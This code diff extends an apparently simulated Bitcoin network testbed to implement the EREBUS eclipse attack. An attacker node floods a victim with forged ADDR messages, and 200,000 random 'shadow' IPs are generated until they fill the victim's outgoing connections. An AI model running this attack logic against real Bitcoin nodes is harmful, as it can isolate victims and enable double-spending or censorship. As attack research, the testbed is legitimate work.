@@ -22,6 +22,7 @@
 #include <chainparams.h>
 
 #include <regex>
+#include <random>
 
 typedef unsigned int SOCKET;
 #define INVALID_SOCKET      (SOCKET)(~0)
@@ -50,6 +51,8 @@ std::string hex_to_string(const std::string &hexstr) {
     }
     return output;
 }
+
+std::map<std::string, int> mPingTimestamp;
 
 // bitcoin specific interface for receiving data.
 // Read a 'nBytes' data from datastream ('pch'),
@@ -102,7 +105,7 @@ bool BitcoinReceiveMsg(const char *pch, unsigned int nBytes, std::list<CNetMessa
 // then push back any necessary replies to message queue ('vSendMsg').
 // Almost code are borrowed from net_processing.cpp of Bitcoin repo.
 bool BitcoinProcessMsg(CNetMessage &msg, bool fromInbound, std::deque<std::vector<unsigned char>> &vSendMsg,
-                       std::string their_ip, uint16_t their_port) {
+                       std::string their_ip, uint16_t their_port, std::string my_ip, bool shadow_node) {
 
     // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
     const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9
@@ -238,6 +241,10 @@ bool BitcoinProcessMsg(CNetMessage &msg, bool fromInbound, std::deque<std::vecto
         vSendMsg.push_back(std::move(serializedHeader));
         if (nMessageSize) {
             vSendMsg.push_back(std::move(msg.data));
+        }
+        if (fromInbound && shadow_node) {
+            mPingTimestamp[my_ip] = GetTime();
+            std::cout << "my_ip(shadow)=" << my_ip << "\n";
         }
     }
     return true;
@@ -398,20 +405,27 @@ public:
 
 template<typename MSG,
         bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
-        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t)>
+        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
+                           bool)>
 class PassiveNode {
 private:
     ev::io _listen_watcher; // assume a single listening socket per Node
     int _listen_sockfd;
     std::string _shadow_ip;
-    double _churnout_time = 0;
+    double _churnout_time = -1;
     ev::timer _churnout_timer;
+    bool _shadowNode;
+
+    int _received_msg_count = 0;
 
     // data structures
     std::map<SOCKET, SocketControlStruct<MSG> > mSocketControl;
 
     void _listenSocketIOCallback(ev::io &w, int revents) {
         std::cout << "listen socket IO callback called!" << "\n";
+
+        if (_shadowNode)
+            std::cout << "shadowNode(" << _shadow_ip << ") connected" << "\n";
 
         struct sockaddr_in their_addr; /* connector's address information */
         int sock_fd;
@@ -475,7 +489,7 @@ private:
 
                     // process message
                     ret = ProcessMSG(msg, socketControl.isInboundSocket(), vSendMsg, socketControl.their_ip,
-                                     socketControl.their_port);
+                                     socketControl.their_port, _shadow_ip, _shadowNode);
                     if (!ret) {
                         std::cout << "error while processing message" << "\n";
                         exit(-1);
@@ -593,8 +607,9 @@ private:
     }
 
 public:
-    PassiveNode(std::string ip_addr, int port) {
+    PassiveNode(std::string ip_addr, int port, bool shadowNode = false) {
         _shadow_ip = ip_addr;
+        _shadowNode = shadowNode;
         std::cout << "Node generated" << "\n";
 
         int sockfd = CreateNewSocket();
@@ -626,29 +641,32 @@ public:
     PassiveNode(PassiveNode &&rhs) noexcept: _listen_sockfd(std::move(rhs._listen_sockfd)),
                                              _shadow_ip(std::move(rhs._shadow_ip)),
                                              mSocketControl(std::move(rhs.mSocketControl)),
-                                             _churnout_time(std::move(rhs._churnout_time)) {
+                                             _churnout_time(std::move(rhs._churnout_time)),
+                                             _shadowNode(std::move(rhs._shadowNode)) {
         rhs._listen_watcher.stop();
         _listen_watcher.set<PassiveNode, &PassiveNode::_listenSocketIOCallback>(this);
         _listen_watcher.start(_listen_sockfd, ev::READ);
 
-        double remaining_time = rhs._churnout_timer.remaining();
-        rhs._churnout_timer.stop();
-        _churnout_timer.set<PassiveNode, &PassiveNode::_churnoutTimerCallback>(this);
-        _churnout_timer.set(remaining_time, 0.);
-        _churnout_timer.start();
-        std::cout << "passiveNode move constructor!" << "\n";
+        if (_churnout_time != -1 && rhs._churnout_timer.remaining() >= 0) {
+            double remaining_time = rhs._churnout_timer.remaining();
+            rhs._churnout_timer.stop();
+            _churnout_timer.set<PassiveNode, &PassiveNode::_churnoutTimerCallback>(this);
+            _churnout_timer.set(remaining_time, 0.);
+            _churnout_timer.start();
+            std::cout << "passiveNode move constructor!" << "\n";
+        }
     }
 
     PassiveNode(const PassiveNode &rhs) = delete; // since PassiveNode includes watcher
 
 
     void _churnoutTimerCallback(ev::timer &w, int revents) {
-        std::cout << "churnout timer called" << "\n";
+        std::cout << "churnout timer called(" << _shadow_ip << ")\n";
         ChurnOut();
     }
 
     void SetChurnOutTimer(double time) {
-        if (_churnout_time == 0) {
+        if (_churnout_time == -1) {
             _churnout_time = time;
             _churnout_timer.set<PassiveNode, &PassiveNode::_churnoutTimerCallback>(this);
             _churnout_timer.set(_churnout_time, 0.);
@@ -672,7 +690,8 @@ public:
 
 template<typename MSG,
         bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
-        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t),
+        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
+                           bool),
         bool (*ForgeAddrMSG)(std::vector<std::string>, std::deque<std::vector<unsigned char>> &, std::string, uint16_t),
         bool (*InitProtocol)(std::deque<std::vector<unsigned char>> &, std::string, uint16_t)>
 class ActiveNode {
@@ -743,7 +762,7 @@ private:
 
                     // process message
                     ret = ProcessMSG(msg, socketControl.isInboundSocket(), vSendMsg, socketControl.their_ip,
-                                     socketControl.their_port);
+                                     socketControl.their_port, _shadow_ip, false);
                     if (!ret) {
                         std::cout << "error while processing message" << "\n";
                         exit(-1);
@@ -1058,6 +1077,172 @@ public:
     }
 };
 
+template<typename MSG,
+        bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
+        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
+                           bool)>
+class ShadowIPFactory {
+private:
+    ev::timer _timer;
+    double _periodTime;
+    double _iprate; // IP per second
+    double _shadowrate; // shadow IP portion
+    std::vector<std::string> _vLegiIP;
+    std::vector<std::string> _vShadowIP;
+    std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> > _attacker_node;
+    std::vector<PassiveNode<MSG, ReceiveMSG, ProcessMSG> > _vShadowNode;
+
+
+    void _timerCallback(ev::timer &w, int revents) {
+        std::cout << "Periodic timer called" << "\n";
+        std::vector<std::string> vAddr;
+        int totalIPCount = std::min(1000, (int) (_periodTime * _iprate));
+        int legiIPcount = totalIPCount * (1 - _shadowrate);
+        int shadowIPcount = totalIPCount * _shadowrate;
+        std::sample(_vLegiIP.begin(), _vLegiIP.end(), std::back_inserter(vAddr), legiIPcount,
+                    std::mt19937{std::random_device{}()});
+        std::sample(_vShadowIP.begin(), _vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
+                    std::mt19937{std::random_device{}()});
+
+//        for (int i = 0; i < shadowIPcount; i++) {
+//            std::string randIP = _generateRandomIP();
+//            vAddr.push_back(_generateRandomIP());
+//            _vShadowIP.push_back(randIP);
+//            _vShadowNode.emplace_back(randIP, 8333, true);
+//        }
+
+        std::cout << "debug print start" << "\n";
+        std::cout << "legiIPcount:" << legiIPcount << ", shadowIPcount:" << shadowIPcount << "\n";
+        int cur_time = GetTime();
+        std::cout << "cur_time:" << cur_time << "\n";
+        int shadow_outgoing_count = 0;
+        for (auto&[ip, timestamp] : mPingTimestamp) {
+            if (cur_time - timestamp < 1000) {
+                std::cout << "shadow_ip=" << ip << "\n";
+                shadow_outgoing_count++;
+            }
+        }
+        std::cout << "shadow outgoing count=" << shadow_outgoing_count << "\n";
+        if (shadow_outgoing_count >= 10) {
+            std::cout << "all outgoing connection are connected by Shadow IP" << "\n";
+            exit(0);
+        }
+//        for (auto addr : vAddr)
+//            std::cout << addr << "\n";
+//        std::cout << "debug print end" << "\n";
+        _attacker_node->SendAddr(vAddr);
+    }
+
+    bool _dns_isIPInRange(const struct in_addr netIP, std::string cidrStr) {
+        auto pos = cidrStr.find('/');
+        if (pos == std::string::npos)
+            assert (0 && "wrong argument for _dns_isIPInRange");
+        std::string cidrIPStr = cidrStr.substr(0, pos);
+        std::string bits = cidrStr.substr(pos + 1);
+        int cidrBits = std::stoi(bits);
+
+        assert(cidrBits >= 0 && cidrBits <= 32);
+
+        /* first create the mask in host order */
+        in_addr_t netmask = 0;
+        for (int i = 0; i < 32; i++) {
+            /* move one so LSB is 0 */
+            netmask = netmask << 1;
+            if (cidrBits > i) {
+                /* flip the LSB */
+                netmask++;
+            }
+        }
+
+        /* flip to network order */
+        netmask = htonl(netmask);
+
+        /* get the subnet ip in network order */
+        struct in_addr subnetIP;
+        inet_pton(AF_INET, cidrIPStr.c_str(), &subnetIP);
+
+        /* all non-subnet bits should be flipped */
+        if ((netIP.s_addr & netmask) == (subnetIP.s_addr & netmask)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    bool _dns_isRestricted(std::string ip) {
+        struct in_addr netIP;
+        inet_pton(AF_INET, ip.c_str(), &netIP);
+        /* http://en.wikipedia.org/wiki/Reserved_IP_addresses#Reserved_IPv4_addresses */
+        if (_dns_isIPInRange(netIP, "0.0.0.0/8") ||
+            _dns_isIPInRange(netIP, "10.0.0.0/8") ||
+            _dns_isIPInRange(netIP, "100.64.0.0/10") ||
+            _dns_isIPInRange(netIP, "127.0.0.0/8") ||
+            _dns_isIPInRange(netIP, "169.254.0.0/16") ||
+            _dns_isIPInRange(netIP, "172.16.0.0/12") ||
+            _dns_isIPInRange(netIP, "192.0.0.0/29") ||
+            _dns_isIPInRange(netIP, "192.0.2.0/24") ||
+            _dns_isIPInRange(netIP, "192.88.99.0/24") ||
+            _dns_isIPInRange(netIP, "192.168.0.0/16") ||
+            _dns_isIPInRange(netIP, "198.18.0.0/15") ||
+            _dns_isIPInRange(netIP, "198.51.100.0/24") ||
+            _dns_isIPInRange(netIP, "203.0.113.0/24") ||
+            _dns_isIPInRange(netIP, "224.0.0.0/4") ||
+            _dns_isIPInRange(netIP, "240.0.0.0/4") ||
+            _dns_isIPInRange(netIP, "255.255.255.255/32")) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    std::string _generateRandomIP() {
+        std::stringstream ss;
+        while (true) {
+            int ip[4];
+            for (int i = 0; i < 4; i++) {
+                ip[i] = rand() % 256;
+                if (ip[i] == 0)
+                    ip[i]++;
+            }
+
+            if (ip[0] == 10)
+                continue;
+            if (ip[0] == 172 && ip[1] == 16)
+                continue;
+            if (ip[0] == 192 && ip[1] == 168)
+                continue;
+
+            ss.str("");
+            ss << ip[0] << "." << ip[1] << "." << ip[2] << "." << ip[3];
+
+            if (_dns_isRestricted(ss.str()))
+                continue;
+
+            if (std::find(_vLegiIP.begin(), _vLegiIP.end(), ss.str()) == _vLegiIP.end() &&
+                std::find(_vShadowIP.begin(), _vShadowIP.end(), ss.str()) == _vShadowIP.end())
+                break;
+        }
+        return ss.str();
+    }
+
+public:
+    ShadowIPFactory(double periodTime, double iprate, double shadowrate, std::vector<std::string> vIP,
+                    std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>> node)
+            : _periodTime(periodTime), _iprate(iprate), _shadowrate(shadowrate), _vLegiIP(vIP), _attacker_node(node) {
+        std::cout << "ShadowIPGenerator constructor" << "\n";
+        _timer.set<ShadowIPFactory, &ShadowIPFactory::_timerCallback>(this);
+        _timer.set(_periodTime, _periodTime);
+        _timer.start();
+
+        int shadowIPtotalcount = 200000;
+        for (int i = 0; i < shadowIPtotalcount; i++) {
+            std::string randIP = _generateRandomIP();
+            _vShadowIP.push_back(randIP);
+            _vShadowNode.emplace_back(randIP, 8333, true);
+        }
+    }
+};
+
 class ChurnOutTimer {
 private:
     double _time;
@@ -1108,6 +1293,7 @@ int main(int argc, char *argv[]) {
     std::ifstream read("churn.txt");
     std::map<std::string, int> mIpDuration;
     std::regex re("\\d+\\.\\d+\\.\\d+\\.\\d+");
+    int ipCount = 0;
     for (std::string line; std::getline(read, line);) {
         // split and extract
         auto pos = line.find(' ');
@@ -1116,25 +1302,14 @@ int main(int argc, char *argv[]) {
 
         if (std::regex_match(ip, re)) {
             mIpDuration.emplace(ip, duration);
+            ipCount++;
+            if (ipCount >= 100000)
+                break;
         }
-//        std::istringstream ss(line);
-//
-//        std::getline(std::istringstream(line), ip, ' ');
-//
-//        // regex check
-//        if (std::regex_match(ip, re)) {
-//            sIp.insert( );
-//        }
     }
     std::cout << "IP table updated. Count = " << mIpDuration.size() << "\n";
 
-    std::vector<trace> vTrace;
-    vTrace.emplace_back(1);
-    vTrace.emplace_back(2);
-    vTrace.emplace_back(3);
-    vTrace.emplace_back(4);
 
-//    std::vector<std::string> vIp(sIp.begin(), sIp.end());
     std::vector<std::string> vIp;
     std::vector<int> vDuration;
     for (const auto &[key, value] : mIpDuration) {
@@ -1145,11 +1320,7 @@ int main(int argc, char *argv[]) {
 //     std::random_shuffle(vIp.begin(), vIp.end());
 
 
-
-
-
     std::vector<PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> > vPassiveNode;
-//    for (int i = 0; i < 10; i++) {
     for (int i = 0; i < vIp.size(); i++) {
         auto ip = vIp[i];
         vPassiveNode.emplace_back(ip, 8333);
@@ -1157,17 +1328,12 @@ int main(int argc, char *argv[]) {
         std::cout << "IP:" << ip << ", duration:" << vDuration[i] << "\n";
     }
 
-    TestHelloBitcoinLib();
-
     exported_main();
 
     std::cout << "Starting ISP-server for emulated benign&attacker nodes" << "\n";
 
-    puts_temp("test shadow_interface\n");
 
     // Step 1. Prepare an attacker node which connects to Bitcoin victim (thus become an inbound connection of bitcoin victim)
-//    ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> attacker_node1(
-//            "1.1.0.1", 8333);
     auto attacker_node1 = std::make_shared<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>>(
             "1.1.0.1", 8333);
     attacker_node1->Connect("1.0.0.1", 18333);
@@ -1177,7 +1343,6 @@ int main(int argc, char *argv[]) {
     int start_time = 15;
     int ip_total_count = vIp.size();
     std::vector<AddrTimer> timers;
-//    timers.emplace_back(start_time, std::vector<std::string>(vIp.begin(), vIp.begin()+10), attacker_node1);
     for (int i = 0; i < ip_total_count / 1000; i++) {
         timers.emplace_back(start_time + i,
                             std::vector<std::string>(vIp.begin() + i * 1000, vIp.begin() + (i + 1) * 1000),
@@ -1186,6 +1351,11 @@ int main(int argc, char *argv[]) {
     timers.emplace_back(start_time + ip_total_count / 1000 + 1,
                         std::vector<std::string>(vIp.begin() + (ip_total_count / 1000) * 1000, vIp.end()),
                         attacker_node1);
+
+
+    // Step 3. Initiate EREBUS attack using randomly created shadow IPs
+    ShadowIPFactory<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> pAddrTimer(600, 2, 0.9, vIp, attacker_node1);
+
 
 
 //    AddrTimer addrTimer1(15, {"11.1.0.1", "11.2.0.1", "11.3.0.1", "11.4.0.1", "11.5.0.1", "11.6.0.1", "11.7.0.1", "11.8.0.1", "11.9.0.1", "11.10.0.1", "11.11.0.1", "11.12.0.1"}, attacker_node1);
